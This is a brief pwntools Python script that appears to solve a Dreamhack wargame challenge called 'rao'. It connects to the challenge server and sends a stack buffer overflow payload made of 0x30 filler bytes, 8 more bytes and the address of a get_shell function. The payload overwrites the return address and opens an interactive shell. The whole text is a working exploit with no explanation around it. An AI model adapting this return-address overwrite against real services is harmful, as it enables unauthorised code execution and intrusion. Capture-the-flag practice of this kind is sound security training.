from pwn import*

context.log_level = 'debug'

#p = process('./rao')
p = remote('host3.dreamhack.games', 21851)
e = ELF('./rao')
sh = e.symbols['get_shell']
payload = b'a'*0x30
payload += b'b'*8
payload += p64(sh)
p.sendline(payload)

p.interactive()
